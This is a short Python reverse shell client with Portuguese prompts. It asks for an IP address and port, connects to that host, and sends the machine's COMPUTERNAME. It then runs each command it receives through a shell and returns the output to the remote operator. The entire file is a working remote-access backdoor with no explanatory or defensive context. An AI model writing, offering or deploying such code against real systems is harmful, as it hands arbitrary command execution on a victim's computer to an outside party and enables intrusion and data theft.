#client
#!/usr/bin/python
#-*-coding:utf-8-*-

import socket
import subprocess
import os

host = input("Insira o endereco IP: ")
port = int(input("Insira a porta: "))

def connecta():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((host, port))
    print("[!] Connection Estabilished")
    s.send(os.environ['COMPUTERNAME'])

    while True:
        command = s.recv(1024)
        
        if('terminate' in command):
            s.close()
            break

        else:
            CMD = subprocess.Popen(command, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr= subprocess.PIPE, shell=True)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())
            
def main():
    connecta()
main()
